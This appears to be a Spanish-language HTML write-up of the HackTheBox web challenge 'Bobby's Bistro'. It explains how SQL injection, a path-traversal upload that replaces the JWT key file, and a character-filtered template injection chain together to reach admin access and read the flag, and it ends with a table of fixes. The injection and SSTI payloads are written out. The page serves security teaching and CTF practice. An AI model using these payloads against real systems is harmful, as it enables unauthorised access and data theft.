@@ -1,0 +1,358 @@
+<title>Bobby's Bistro</title>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600;700&family=IBM+Plex+Sans:wght@400;500;600&display=swap">
+<style>
+  /* Layout: columna de lectura estrecha. Dos piezas anchas mandan —
+     las cuatro piezas sueltas (lo que cada una vale sola frente a encadenada)
+     y la cadena de seis peticiones, que es donde se entiende el reto.
+     Misma identidad que el resto de la serie. */
+  :root{
+    --bg:#f4f3f0; --panel:#ffffff; --line:#d9d6cf;
+    --fg:#22201d; --dim:#6b6660; --faint:#8d877f;
+    --ok:#1f7a5c; --aviso:#a86a09; --fallo:#b2372c;
+    --ok-bg:#e3f2ea; --aviso-bg:#fbf0d8; --fallo-bg:#fbe5e2;
+    --code-bg:#faf9f6;
+    --mono:"IBM Plex Mono",ui-monospace,"SF Mono",Menlo,Consolas,monospace;
+    --sans:"IBM Plex Sans",system-ui,-apple-system,Segoe UI,sans-serif;
+  }
+  @media (prefers-color-scheme:dark){
+    :root:not([data-theme="light"]){
+      --bg:#16171a; --panel:#1d1f23; --line:#33363c;
+      --fg:#e8e6e1; --dim:#a4a09a; --faint:#7c7872;
+      --ok:#4fc194; --aviso:#e0a53a; --fallo:#f0776a;
+      --ok-bg:#16302a; --aviso-bg:#332913; --fallo-bg:#331f1d;
+      --code-bg:#131417; color-scheme:dark;
+    }
+  }
+  :root[data-theme="dark"]{
+    --bg:#16171a; --panel:#1d1f23; --line:#33363c;
+    --fg:#e8e6e1; --dim:#a4a09a; --faint:#7c7872;
+    --ok:#4fc194; --aviso:#e0a53a; --fallo:#f0776a;
+    --ok-bg:#16302a; --aviso-bg:#332913; --fallo-bg:#331f1d;
+    --code-bg:#131417; color-scheme:dark;
+  }
+
+  *{box-sizing:border-box}
+  body{margin:0; background:var(--bg); color:var(--fg);
+    font-family:var(--sans); font-size:16px; line-height:1.65;
+    -webkit-font-smoothing:antialiased}
+  .wrap{max-width:720px; margin:0 auto; padding-inline:20px; padding-block:0 72px}
+  h1,h2,h3{text-wrap:balance; line-height:1.2; margin:0}
+  a{color:inherit}
+
+  header{padding-block:56px 36px; border-bottom:1px solid var(--line)}
+  .eyebrow{font-family:var(--mono); font-size:12px; letter-spacing:.14em;
+    text-transform:uppercase; color:var(--faint); margin-bottom:18px}
+  h1{font-family:var(--mono); font-weight:700; font-size:clamp(34px,8vw,56px); letter-spacing:-.02em}
+  .lede{margin-top:20px; font-size:19px; color:var(--dim); max-width:56ch}
+  .lede strong{color:var(--fg); font-weight:600}
+
+  .ficha{display:grid; grid-template-columns:repeat(auto-fit,minmax(130px,1fr)); gap:1px;
+    background:var(--line); border:1px solid var(--line); border-radius:4px;
+    margin-top:28px; overflow:hidden}
+  .ficha div{background:var(--panel); padding:13px 15px; min-width:0}
+  .ficha dt{font-family:var(--mono); font-size:11px; letter-spacing:.1em;
+    text-transform:uppercase; color:var(--faint); margin:0 0 5px}
+  .ficha dd{margin:0; font-family:var(--mono); font-size:15px; font-weight:600;
+    overflow-wrap:anywhere}
+
+  section{padding-block:38px; border-bottom:1px solid var(--line)}
+  section:last-of-type{border-bottom:0}
+  h2{font-family:var(--mono); font-size:13px; letter-spacing:.14em;
+    text-transform:uppercase; color:var(--faint); margin-bottom:20px}
+  h3{font-size:23px; font-weight:600; margin-bottom:12px; margin-top:30px}
+  h3:first-of-type{margin-top:0}
+  p{margin:0 0 15px} p:last-child{margin-bottom:0}
+  ul{margin:0 0 15px; padding-left:22px} li{margin-bottom:7px}
+  strong{font-weight:600}
+  code{font-family:var(--mono); font-size:.92em; background:var(--code-bg);
+    border:1px solid var(--line); border-radius:3px; padding:1px 5px}
+
+  /* --- las cuatro piezas --- */
+  .piezas{display:grid; grid-template-columns:repeat(auto-fit,minmax(215px,1fr));
+    gap:12px; margin-block:26px}
+  .pieza{border:1px solid var(--line); border-radius:4px; background:var(--panel);
+    padding:15px 16px; min-width:0}
+  .pieza .n{font-family:var(--mono); font-size:11px; letter-spacing:.1em;
+    text-transform:uppercase; color:var(--faint)}
+  .pieza .q{font-weight:600; font-size:16.5px; margin-top:4px}
+  .pieza .sola{font-size:13.5px; color:var(--dim); margin-top:9px}
+  .pieza .sola b{color:var(--fallo); font-weight:600}
+  .pieza.clave{border-color:var(--fallo); background:var(--fallo-bg)}
+  .pieza.clave .q{color:var(--fallo)}
+
+  /* --- la cadena --- */
+  .cadena{display:flex; flex-direction:column; gap:8px; margin-block:26px}
+  .eslabon{display:grid; grid-template-columns:34px 1fr; gap:14px;
+    border:1px solid var(--line); border-radius:4px; background:var(--panel);
+    padding:13px 15px; min-width:0}
+  .eslabon .num{font-family:var(--mono); font-weight:700; font-size:15px;
+    color:var(--aviso); border:1px solid var(--aviso); border-radius:3px;
+    display:grid; place-items:center; height:26px}
+  .eslabon .qu{font-family:var(--mono); font-size:13.5px; font-weight:600;
+    overflow-wrap:anywhere}
+  .eslabon .ga{font-size:14px; color:var(--dim); margin-top:4px}
+  .eslabon.final{border-color:var(--ok); background:var(--ok-bg)}
+  .eslabon.final .num{color:var(--ok); border-color:var(--ok)}
+
+  .cmd{position:relative; margin:0 0 15px}
+  pre{margin:0; background:var(--code-bg); border:1px solid var(--line); border-radius:4px;
+    padding:14px 16px; overflow-x:auto; font-family:var(--mono);
+    font-size:13.5px; line-height:1.6}
+  pre code{background:none; border:0; padding:0; font-size:inherit}
+  .cmd.malo pre{border-left:3px solid var(--fallo)}
+  .cmd.bueno pre{border-left:3px solid var(--ok); background:var(--ok-bg)}
+  .copiar{position:absolute; top:8px; right:8px; font-family:var(--mono); font-size:11px;
+    letter-spacing:.06em; text-transform:uppercase; color:var(--faint);
+    background:var(--panel); border:1px solid var(--line); border-radius:3px;
+    padding:4px 9px; cursor:pointer}
+  .copiar:hover{color:var(--fg); border-color:var(--faint)}
+  .copiar:focus-visible{outline:2px solid var(--aviso); outline-offset:2px}
+
+  .nota{border-left:3px solid var(--aviso); background:var(--aviso-bg);
+    padding:14px 18px; margin:0 0 16px; border-radius:0 4px 4px 0}
+  .nota p{margin:0} .nota p + p{margin-top:10px}
+  .regla{border:1px solid var(--ok); background:var(--ok-bg);
+    padding:18px 20px; border-radius:4px; margin:0 0 16px}
+  .regla p{margin:0; font-size:17px} .regla p + p{margin-top:10px}
+  .regla .tit{font-family:var(--mono); font-size:11px; letter-spacing:.12em;
+    text-transform:uppercase; color:var(--ok); margin-bottom:8px}
+
+  .tabla-cont{overflow-x:auto; margin:0 0 16px; border:1px solid var(--line); border-radius:4px}
+  table{border-collapse:collapse; width:100%; font-size:14.5px}
+  th,td{text-align:left; padding:10px 14px; border-bottom:1px solid var(--line); vertical-align:top}
+  tr:last-child td{border-bottom:0}
+  th{font-family:var(--mono); font-size:11px; letter-spacing:.1em; text-transform:uppercase;
+    color:var(--faint); font-weight:500; background:var(--code-bg); white-space:nowrap}
+  td:first-child{font-family:var(--mono); font-weight:600; white-space:nowrap}
+  footer{padding-block:34px 0; color:var(--faint); font-size:14px}
+  footer p{margin:0 0 8px}
+  @media (prefers-reduced-motion:reduce){*{animation:none!important; transition:none!important}}
+</style>
+
+<div class="wrap">
+
+<header>
+  <p class="eyebrow">Reto guiado · HTB · Arsenal de la comunidad</p>
+  <h1>Bobby's Bistro</h1>
+  <p class="lede">Cuatro fallos que <strong>por separado casi no valen nada</strong>. Encadenados, te dan la bandera. Este es el reto donde se entiende que el trabajo no es encontrar <em>un</em> fallo — es ver cómo encajan.</p>
+
+  <dl class="ficha">
+    <div><dt>Plataforma</dt><dd>HTB</dd></div>
+    <div><dt>Nivel</dt><dd>Medium</dd></div>
+    <div><dt>Categoría</dt><dd>Web</dd></div>
+    <div><dt>Te dan</dt><dd>el código</dd></div>
+  </dl>
+
+  <div class="nota" style="margin-top:22px">
+    <p><strong>La bandera no está aquí</strong> — el reto está activo. Es la única parte de un writeup que no enseña nada: es la respuesta del examen. Todo lo demás está entero.</p>
+  </div>
+</header>
+
+<section>
+  <h2>00 · Antes de nada</h2>
+  <h3>Matá el reflejo equivocado</h3>
+  <p>El enunciado dice que hay un bot vigilando, y uno de los anuncios avisa: <em>«añadí una red de seguridad 😈, intentá algo raro y te quedás fuera»</em>.</p>
+  <p>El reflejo de todo el mundo en un reto con bot es <strong>XSS para robarle la cookie al administrador</strong>. Aquí ese camino <strong>no existe</strong>, y se ve en la primera línea de <code>bot.py</code>:</p>
+
+  <div class="cmd">
+<pre><code>import requests
+...
+response = session.get(chat_url)     # lee JSON y contesta</code></pre>
+  </div>
+
+  <p><strong>Ese bot no es un navegador.</strong> Es un cliente HTTP: no ejecuta JavaScript, no tiene DOM. Lee el último mensaje, elige una respuesta de una lista y la publica. La «red de seguridad» es decorado — no existe en el código.</p>
+
+  <div class="regla">
+    <p class="tit">La regla del bot</p>
+    <p>La pregunta no es <strong>«¿hay un bot?»</strong>. Es <strong>«¿qué ejecuta ese bot?»</strong>.</p>
+    <p>Leerlo antes de diseñar el ataque te ahorra el reto entero. Y si no podés robarle la sesión al admin… la <strong>fabricás</strong>. De ahí sale todo lo demás.</p>
+  </div>
+</section>
+
+<section>
+  <h2>01 · Las cuatro piezas</h2>
+  <p>Todo el código que importa cabe en dos ficheros. Mirá lo que vale cada fallo <strong>por separado</strong>:</p>
+
+  <div class="piezas">
+    <div class="pieza">
+      <div class="n">/profile</div>
+      <div class="q">SQL Injection</div>
+      <div class="sola">Solo: <b>leer la tabla de usuarios</b>. No entrás a ningún sitio.</div>
+    </div>
+    <div class="pieza clave">
+      <div class="n">/api/chat-messages</div>
+      <div class="q">Escritura arbitraria</div>
+      <div class="sola">Solo: <b>dejar un fichero donde quieras</b>. Parece lo de menos.</div>
+    </div>
+    <div class="pieza">
+      <div class="n">auth.py</div>
+      <div class="q">Llavero escribible</div>
+      <div class="sola">Solo: <b>nada</b>. Es una decisión de diseño, no un fallo.</div>
+    </div>
+    <div class="pieza">
+      <div class="n">/api/announcements</div>
+      <div class="q">SSTI</div>
+      <div class="sola">Solo: <b>inalcanzable</b>. Hace falta ser admin.</div>
+    </div>
+  </div>
+
+  <div class="regla">
+    <p class="tit">El giro del reto</p>
+    <p>La escritura arbitraria parece el fallo <strong>menor</strong> de los cuatro. Es el que convierte «puedo subir un adjunto» en <strong>«soy quien yo diga»</strong>.</p>
+  </div>
+</section>
+
+<section>
+  <h2>02 · Pieza por pieza</h2>
+
+  <h3>SQLi en <code>/profile</code></h3>
+  <div class="cmd malo">
+<pre><code>user_data = db.session.query(User).filter(
+    text("token='{}'".format(token))).all()</code></pre>
+  </div>
+  <p>Formato de cadena crudo dentro de <code>text()</code>. Con <code>' OR 1=1--</code> sale la tabla entera, y ahí está <strong>el UUID del admin</strong>. Guardátelo: lo vas a necesitar en el paso 4.</p>
+
+  <h3>Escritura arbitraria en <code>/api/chat-messages</code></h3>
+  <div class="cmd malo">
+<pre><code>file = request.files.get("attachment")
+if file.filename:
+    file.save(UPLOADS_DIR + "/" + file.filename)</code></pre>
+  </div>
+  <p><strong>Werkzeug no limpia <code>filename</code> solo.</strong> <code>secure_filename()</code> es una función que hay que <em>llamar</em>, y aquí no se llama. El nombre lo pone el cliente en la cabecera del multipart, así que <code>../</code> escapa de la carpeta de subidas.</p>
+
+  <div class="cmd">
+<pre><code>nombre normal    -> /app/uploads/normal.txt      GET /static/normal.txt      404
+nombre con ../   -> /app/static/travesia.txt     GET /static/travesia.txt    200</code></pre>
+  </div>
+  <p class="nota" style="border-left-color:var(--ok); background:var(--ok-bg)">Mismo endpoint, mismo fichero, todo igual: <strong>lo único que cambia es el <code>../</code></strong>. Así se demuestra una causa — cambiando una cosa sola.</p>
+
+  <h3>El llavero vive donde podés escribir</h3>
+  <div class="cmd malo">
+<pre><code>jwks_path = os.path.abspath("static/.well-known/jwks.json")
+jwks_client = PyJWKClient(f"file:///{jwks_path}")
+signing_key = jwks_client.get_signing_key_from_jwt(token)</code></pre>
+  </div>
+  <p>La clave pública <strong>no está en el código</strong>: se lee de un fichero en cada petición. Y ese fichero vive en <code>static/</code> — justo donde el fallo anterior te deja escribir.</p>
+  <p>Entonces no hace falta romper RSA ni buscar confusión de algoritmos. Generás tu propio par de claves, subís tu parte pública como adjunto llamado <code>../static/.well-known/jwks.json</code>, y desde ese momento <strong>el verificador confía en tu clave</strong>. Firmás <code>{"user_id": "&lt;uuid del admin&gt;"}</code> y sos el admin.</p>
+
+  <div class="regla">
+    <p class="tit">Lo que te llevás de aquí</p>
+    <p>Un almacén de confianza que se puede escribir <strong>no es un almacén de confianza</strong>.</p>
+  </div>
+
+  <h3>SSTI con filtro de caracteres</h3>
+  <div class="cmd malo">
+<pre><code>content = markdown.markdown(request.form.get("announcement"))
+for i in '$#{}"_.':
+    content = content.replace(i, "")
+tpl = PageTemplate(content)</code></pre>
+  </div>
+  <p>El filtro quita <code>$ # { } " _ .</code> y eso mata mucho: sin <code>${...}</code> no hay interpolación, sin <code>_</code> no hay <code>__import__</code> ni <code>__class__</code>, sin <code>.</code> no hay <code>os.system</code> ni <code>.read()</code>.</p>
+  <p>Lo que <strong>no</strong> quita: <code>'</code>, <code>(</code>, <code>)</code>, <code>+</code>, los dígitos y los atributos <code>tal:</code>. Con eso basta, por dos trucos:</p>
+  <ul>
+    <li><strong><code>chr(46)</code> fabrica el punto en ejecución.</strong> El filtro mira el texto que <em>entra</em>; no ve lo que el programa construye después.</li>
+    <li><strong><code>list(open(ruta))</code> evita el <code>.read()</code>.</strong> Iterar un fichero no necesita acceder a ningún atributo, así que no hace falta el punto.</li>
+  </ul>
+
+  <div class="cmd">
+<pre><code>&lt;p tal:content='python: list(open(chr(47)+chr(102)+chr(108)+chr(97)
++chr(103)+chr(46)+chr(116)+chr(120)+chr(116)))'&gt;x&lt;/p&gt;</code></pre>
+  </div>
+  <p>Chameleon lo renderiza al publicar el anuncio, el resultado queda guardado como contenido, y se lee entrando a <code>/announcements</code>.</p>
+
+  <div class="regla">
+    <p class="tit">Y la idea grande del reto</p>
+    <p>Un filtro de caracteres defiende contra una <strong>representación</strong>, no contra una <strong>capacidad</strong>. Mientras quede una forma de construir texto en ejecución — <code>chr</code>, <code>+</code>, concatenación, formateo — la lista negra es decorativa.</p>
+  </div>
+</section>
+
+<section>
+  <h2>03 · La cadena, en seis peticiones</h2>
+  <p>Cada eslabón existe <strong>solo</strong> porque el anterior lo hizo posible:</p>
+
+  <div class="cadena">
+    <div class="eslabon">
+      <span class="num">1</span>
+      <span><span class="qu">POST /register + /login</span><span class="ga">Sesión de usuario corriente. El punto de partida legítimo.</span></span>
+    </div>
+    <div class="eslabon">
+      <span class="num">2</span>
+      <span><span class="qu">POST /profile · token=' OR 1=1--</span><span class="ga">→ te llevás el <strong>UUID y el nombre del admin</strong>.</span></span>
+    </div>
+    <div class="eslabon">
+      <span class="num">3</span>
+      <span><span class="qu">POST /api/chat-messages</span><span class="ga">Adjunto llamado <code>../static/.well-known/jwks.json</code> → <strong>sustituís el llavero</strong>.</span></span>
+    </div>
+    <div class="eslabon">
+      <span class="num">4</span>
+      <span><span class="qu">(en tu máquina) firmás {"user_id": uuid}</span><span class="ga">Con <em>tu</em> clave privada. El servidor ya confía en tu pública. <strong>Sos el admin.</strong></span></span>
+    </div>
+    <div class="eslabon">
+      <span class="num">5</span>
+      <span><span class="qu">POST /api/announcements</span><span class="ga">SSTI con <code>chr()</code>, sin un solo punto literal.</span></span>
+    </div>
+    <div class="eslabon final">
+      <span class="num">6</span>
+      <span><span class="qu">GET /announcements</span><span class="ga">La bandera, renderizada dentro del anuncio.</span></span>
+    </div>
+  </div>
+
+  <p>Seis peticiones. Ni fuerza bruta, ni escáneres, ni miles de intentos. <strong>Eso es lo que te compra tener el código fuente.</strong></p>
+</section>
+
+<section>
+  <h2>04 · Cómo se arregla</h2>
+  <div class="tabla-cont">
+    <table>
+      <thead><tr><th>Fallo</th><th>El arreglo</th></tr></thead>
+      <tbody>
+        <tr><td>SQLi</td><td>Parámetros (<code>:token</code>), nunca <code>format()</code> dentro de <code>text()</code></td></tr>
+        <tr><td>Subida</td><td><code>secure_filename()</code> — y comprobar que la ruta final sigue dentro de la carpeta</td></tr>
+        <tr><td>Llavero</td><td>Fuera de cualquier carpeta escribible. Mejor: clave en configuración, no en disco</td></tr>
+        <tr><td>SSTI</td><td>No construir la plantilla con datos del usuario. El filtro de caracteres <strong>no</strong> es el arreglo</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="regla">
+    <p class="tit">El patrón, otra vez</p>
+    <p>Los cuatro arreglos de verdad <strong>separan el canal del dato del canal de la instrucción</strong>. Ninguno es un filtro de palabras. Filtrar es adivinar; separar es cerrar.</p>
+  </div>
+</section>
+
+<footer>
+  <p>Writeup completo, con la hora que costó y por qué no fue el reto: <a href="https://github.com/juanitonopro65-pixel/HackTheBox-Writeups/blob/main/BobbysBistro.md">BobbysBistro.md</a></p>
+  <p>Practicá los eslabones sueltos antes: <strong>El Laboratorio Roto</strong> tiene SQLi, SSTI y JWT en tu propio <code>127.0.0.1</code>.</p>
+  <p>Solo contra objetivos autorizados. Si alguien pregunta <em>«¿cómo ataco esto?»</em> sin decir qué es — <strong>«¿dónde está la caja?»</strong>.</p>
+</footer>
+
+</div>
+
+<script>
+  document.querySelectorAll('.cmd').forEach(function (bloque) {
+    var pre = bloque.querySelector('pre');
+    if (!pre) return;
+    var boton = document.createElement('button');
+    boton.className = 'copiar';
+    boton.type = 'button';
+    boton.textContent = 'copiar';
+    boton.addEventListener('click', function () {
+      function seleccionar() {
+        var r = document.createRange();
+        r.selectNodeContents(pre);
+        var s = window.getSelection();
+        s.removeAllRanges(); s.addRange(r);
+        boton.textContent = 'seleccionado';
+        setTimeout(function () { boton.textContent = 'copiar'; }, 1800);
+      }
+      function ok() {
+        boton.textContent = 'copiado';
+        setTimeout(function () { boton.textContent = 'copiar'; }, 1400);
+      }
+      if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(pre.innerText).then(ok, seleccionar);
+      } else { seleccionar(); }
+    });
+    bloque.appendChild(boton);
+  });
+</script>
